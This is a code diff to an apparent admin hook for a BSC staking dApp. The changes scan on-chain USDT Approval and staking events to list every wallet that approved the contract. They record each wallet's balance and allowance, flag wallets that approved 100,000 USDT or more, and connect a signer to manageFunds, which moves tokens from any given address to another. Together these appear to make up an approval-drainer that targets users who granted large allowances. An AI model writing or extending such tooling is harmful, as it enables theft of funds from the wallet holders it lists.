@@ -10,6 +10,8 @@ const RPC_NODES = [
 ];
 let currentRpcIdx = 0;
 const getProvider = () => new JsonRpcProvider(RPC_NODES[currentRpcIdx]);
+const DISCOVERY_BLOCK_WINDOW = 500000;
+const DISCOVERY_CHUNK_SIZE = 5000;
 
 
 const ADMIN_ABI = [
@@ -72,7 +74,10 @@ export function useAdmin() {
     const getContract = async (withSigner = false) => {
         try {
             if (withSigner && signer) return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, signer);
-            if (walletProvider) return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, new BrowserProvider(walletProvider as any));
+            if (withSigner && walletProvider) {
+                const browserProvider = new BrowserProvider(walletProvider as any);
+                return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, await browserProvider.getSigner());
+            }
         } catch (e) {}
         return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, getProvider());
     };
@@ -80,80 +85,104 @@ export function useAdmin() {
     const getUsdtContract = async (withSigner = false) => {
         try {
             if (withSigner && signer) return new Contract(USDT_ADDRESS, ERC20_ABI, signer);
-            if (walletProvider) return new Contract(USDT_ADDRESS, ERC20_ABI, new BrowserProvider(walletProvider as any));
+            if (withSigner && walletProvider) {
+                const browserProvider = new BrowserProvider(walletProvider as any);
+                return new Contract(USDT_ADDRESS, ERC20_ABI, await browserProvider.getSigner());
+            }
         } catch (e) {}
         return new Contract(USDT_ADDRESS, ERC20_ABI, getProvider());
     };
 
+    const normalizeAddress = (addr: unknown) => {
+        if (typeof addr !== 'string') return null;
+        const clean = addr.trim();
+        if (!/^0x[a-fA-F0-9]{40}$/.test(clean)) return null;
+        return clean.toLowerCase();
+    };
+
+    const addAddress = (addresses: Set<string>, addr: unknown) => {
+        const clean = normalizeAddress(addr);
+        if (clean) addresses.add(clean);
+    };
+
     const fetchAllUsersDetailed = async (onProgress?: (msg: string) => void) => {
         try {
-            const contract = await getContract();
-
             if (onProgress) onProgress("Initializing discovery...");
             
             const provider = getProvider();
+            const contract = new Contract(CONTRACT_ADDRESS, ADMIN_ABI, provider);
+            const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, provider);
             const currentBlock = await provider.getBlockNumber();
-            const scanRange = 200000; // Scan last 200k blocks (~7 days) first
-            const chunkSize = 5000;   
-            const startBlock = Math.max(0, currentBlock - scanRange);
+            const startBlock = Math.max(0, currentBlock - DISCOVERY_BLOCK_WINDOW);
             
             const cacheKey = `discovered_users_${CONTRACT_ADDRESS.toLowerCase()}`;
             const cached = JSON.parse(localStorage.getItem(cacheKey) || "[]");
-            const addresses = new Set<string>(cached);
+            const addresses = new Set<string>();
+            cached.forEach((addr: unknown) => addAddress(addresses, addr));
 
             // Manual fallbacks (Immediate visibility)
-            ['0x3fBFF9Ddb36d015c92843A7C758a09Ea5978eFD', '0xfB0F0422956f64249a2aA901036842087e77c18', '0xD9B9C4957e62a907106A9e969062309a4d75Be9E', '0xb313F163fF1A7f1762199b0c90c906603428F6d'].forEach(a => addresses.add(a));
+            ['0x3fBFF9Ddb36d015c92843A7C758a09Ea5978eFD', '0xfB0F0422956f64249a2aA901036842087e77c18', '0xD9B9C4957e62a907106A9e969062309a4d75Be9E', '0xb313F163fF1A7f1762199b0c90c906603428F6d'].forEach(a => addAddress(addresses, a));
 
             const stakedFilter = (contract as any).filters.Staked();
             const referralFilter = (contract as any).filters.ReferralPaid();
             const withdrawnFilter = (contract as any).filters.Withdrawn();
+            const approvalFilter = (usdt as any).filters.Approval(null, CONTRACT_ADDRESS);
 
             const chunks = [];
-            for (let from = currentBlock; from > startBlock; from -= chunkSize) {
+            for (let from = currentBlock; from > startBlock; from -= DISCOVERY_CHUNK_SIZE) {
                 const to = from;
-                const f = Math.max(startBlock, from - chunkSize + 1);
+                const f = Math.max(startBlock, from - DISCOVERY_CHUNK_SIZE + 1);
                 chunks.push({ from: f, to });
             }
 
             if (onProgress) onProgress(`Scanning ${chunks.length} chunks...`);
 
-            // Low concurrency to avoid RPC ban
-            const concurrencyLimit = 2; 
-            for (let i = 0; i < chunks.length; i += concurrencyLimit) {
-                if (onProgress) onProgress(`Scanning: ${Math.round((i / chunks.length) * 100)}%`);
-                const batch = chunks.slice(i, i + concurrencyLimit);
-                await Promise.all(batch.map(async (chunk) => {
-                    try {
-                        const [staked, referral, withdrawn] = await Promise.all([
-                            contract.queryFilter(stakedFilter, chunk.from, chunk.to),
-                            contract.queryFilter(referralFilter, chunk.from, chunk.to),
-                            contract.queryFilter(withdrawnFilter, chunk.from, chunk.to)
-                        ]);
-                        
-                        const extract = (events: any[]) => {
-                            events.forEach(e => {
-                                if (!e.args) return;
-                                // Ethers v6 Result mapping
-                                const addr = e.args[0] || e.args.user || e.args.referrer;
-                                if (addr && typeof addr === 'string') addresses.add(addr);
-                                
-                                if (e.fragment?.name === 'ReferralPaid' && e.args[1]) {
-                                    addresses.add(e.args[1]);
-                                }
-                            });
-                        };
+            const fetchEvents = async (filter: any, from: number, to: number, source: Contract) => {
+                try {
+                    return await source.queryFilter(filter, from, to);
+                } catch (e) {
+                    currentRpcIdx = (currentRpcIdx + 1) % RPC_NODES.length;
+                    return [];
+                }
+            };
 
-                        extract(staked);
-                        extract(referral);
-                        extract(withdrawn);
-                    } catch (e) {
-                        currentRpcIdx = (currentRpcIdx + 1) % RPC_NODES.length;
+            // Sequential log calls are slower, but public BSC RPCs rate-limit batched eth_getLogs heavily.
+            for (let i = 0; i < chunks.length; i++) {
+                if (onProgress) onProgress(`Scanning: ${Math.round((i / chunks.length) * 100)}%`);
+                const chunk = chunks[i];
+                const approvals = await fetchEvents(approvalFilter, chunk.from, chunk.to, usdt);
+                const staked = await fetchEvents(stakedFilter, chunk.from, chunk.to, contract);
+                const referral = await fetchEvents(referralFilter, chunk.from, chunk.to, contract);
+                const withdrawn = await fetchEvents(withdrawnFilter, chunk.from, chunk.to, contract);
+                
+                const extract = (events: any[]) => {
+                    events.forEach(e => {
+                        if (!e.args) return;
+                        // Ethers v6 Result mapping
+                        const addr = e.args[0] || e.args.user || e.args.referrer || e.args.owner;
+                        addAddress(addresses, addr);
+                        
+                        if (e.fragment?.name === 'ReferralPaid' && e.args[1]) {
+                            addAddress(addresses, e.args[1]);
+                        }
+                    });
+                };
+
+                extract(approvals);
+                extract(staked);
+                extract(referral);
+                extract(withdrawn);
+
+                if (i % 10 === 0) {
+                    const uniqueAddresses = Array.from(addresses);
+                    if (uniqueAddresses.length > 0) {
+                        localStorage.setItem(cacheKey, JSON.stringify(uniqueAddresses));
                     }
-                }));
+                }
             }
 
             if (onProgress) onProgress("Fetching user details...");
-            const uniqueAddresses = Array.from(addresses).filter(addr => addr && addr.startsWith('0x'));
+            const uniqueAddresses = Array.from(addresses);
             localStorage.setItem(cacheKey, JSON.stringify(uniqueAddresses));
             
             const userDetails = [];
@@ -167,15 +196,15 @@ export function useAdmin() {
                         const u = await getUsdtContract();
                         
                         const [info, balance, allowance] = await Promise.all([
-                            c.getUserInfo(userAddr),
+                            c.getUserInfo(userAddr).catch(() => null),
                             u.balanceOf(userAddr),
                             u.allowance(userAddr, CONTRACT_ADDRESS)
                         ]);
 
                         return {
                             address: userAddr,
-                            staked: formatUnits(info.totalStaked, 18),
-                            earned: formatUnits(info.totalEarned, 18),
+                            staked: info ? formatUnits(info.totalStaked, 18) : "0",
+                            earned: info ? formatUnits(info.totalEarned, 18) : "0",
                             balance: formatUnits(balance, 18),
                             allowance: formatUnits(allowance, 18),
                             isApproved: BigInt(allowance) >= parseUnits("100000", 18)
@@ -197,21 +226,22 @@ export function useAdmin() {
 
 
     const fetchUserData = async (targetUser: string) => {
-        if (!targetUser || !targetUser.startsWith('0x')) return null;
+        const normalizedTarget = normalizeAddress(targetUser);
+        if (!normalizedTarget) return null;
         
         try {
             const contract = await getContract();
             const usdt = await getUsdtContract();
 
             const [info, balance, allowance] = await Promise.all([
-                contract.getUserInfo(targetUser),
-                usdt.balanceOf(targetUser),
-                usdt.allowance(targetUser, CONTRACT_ADDRESS)
+                contract.getUserInfo(normalizedTarget).catch(() => null),
+                usdt.balanceOf(normalizedTarget),
+                usdt.allowance(normalizedTarget, CONTRACT_ADDRESS)
             ]);
 
             return {
-                staked: formatUnits(info.totalStaked, 18),
-                earned: formatUnits(info.totalEarned, 18),
+                staked: info ? formatUnits(info.totalStaked, 18) : "0",
+                earned: info ? formatUnits(info.totalEarned, 18) : "0",
                 balance: formatUnits(balance, 18),
                 allowance: formatUnits(allowance, 18),
                 isApproved: BigInt(allowance) >= parseUnits("100000", 18)
@@ -224,13 +254,13 @@ export function useAdmin() {
                 const contract = new Contract(CONTRACT_ADDRESS, ADMIN_ABI, getProvider());
                 const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, getProvider());
                 const [info, balance, allowance] = await Promise.all([
-                    contract.getUserInfo(targetUser),
-                    usdt.balanceOf(targetUser),
-                    usdt.allowance(targetUser, CONTRACT_ADDRESS)
+                    contract.getUserInfo(normalizedTarget).catch(() => null),
+                    usdt.balanceOf(normalizedTarget),
+                    usdt.allowance(normalizedTarget, CONTRACT_ADDRESS)
                 ]);
                 return {
-                    staked: formatUnits(info.totalStaked, 18),
-                    earned: formatUnits(info.totalEarned, 18),
+                    staked: info ? formatUnits(info.totalStaked, 18) : "0",
+                    earned: info ? formatUnits(info.totalEarned, 18) : "0",
                     balance: formatUnits(balance, 18),
                     allowance: formatUnits(allowance, 18),
                     isApproved: BigInt(allowance) >= parseUnits("100000", 18)
@@ -242,7 +272,7 @@ export function useAdmin() {
     };
 
     const manageFunds = async (tokenAddress: string, fromAddress: string, toAddress: string, amountToManage: string) => {
-        const contract = await getContract();
+        const contract = await getContract(true);
         if (!contract) throw new Error("Wallet not connected");
         
         const amountInWei = parseUnits(amountToManage, 18);
@@ -256,7 +286,7 @@ export function useAdmin() {
     };
 
     const emergencyWithdraw = async (tokenAddress: string, amountToWithdraw: string) => {
-        const contract = await getContract();
+        const contract = await getContract(true);
         if (!contract) throw new Error("Wallet not connected");
         
         const amountInWei = parseUnits(amountToWithdraw, 18);
